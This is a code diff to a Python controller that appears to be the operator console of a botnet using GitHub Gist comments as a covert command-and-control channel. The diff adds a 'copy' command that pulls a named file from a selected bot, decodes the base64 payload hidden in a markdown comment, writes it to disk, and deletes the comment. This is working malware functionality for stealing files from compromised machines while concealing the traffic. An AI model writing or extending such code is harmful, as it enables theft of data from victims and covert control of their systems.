@@ -52,6 +52,13 @@ class Controller:
                 path = input("Enter path of the directory: ")
                 command_id = self.send_command(cmd.COMMAND_DIRECTORY["command"], None, path)
                 self.listen_for_answer(command_id)
+            elif command == cmd.COMMAND_COPY["name"]:
+                if self.current_bot is None:
+                    print("No bot selected")
+                    continue
+                path = input("Enter path of the file: ")
+                command_id = self.send_command(cmd.COMMAND_COPY["command"], None, path)
+                self.listen_for_answer(command_id, os.path.basename(path))
             elif command == cmd.COMMAND_RUN["name"]:
                 if self.current_bot is None:
                     print("No bot selected")
@@ -77,7 +84,7 @@ class Controller:
         self.last_tag = res.headers["ETag"]
         return str(res.json()["id"])
 
-    def listen_for_answer(self, command_id: str) -> None:
+    def listen_for_answer(self, command_id: str, filename: str = None) -> None:
         headers = self.headers
         while True:
             if self.last_tag is not None:
@@ -89,7 +96,15 @@ class Controller:
             self.last_tag = None
             break
         message = re.search("<!---MESSAGE-(.*)-->", res.json()["body"]).group(1)
-        print(u.decode_data_from_base64(u.decode_data_from_markdown(message)).decode("utf-8"))
+        decoded_bytes = u.decode_data_from_base64(u.decode_data_from_markdown(message))
+        txt = decoded_bytes.decode("utf-8")
+        if filename is None or txt == "File not found":
+            print(txt)
+        else:
+            file_handler = open(filename, "wb")
+            file_handler.write(decoded_bytes)
+            file_handler.close()
+            print("File saved as " + filename)
         requests.delete(self.gist_url + "/comments/" + command_id, headers=self.headers)
 
     def bot_available(self, bot_name: str) -> bool:
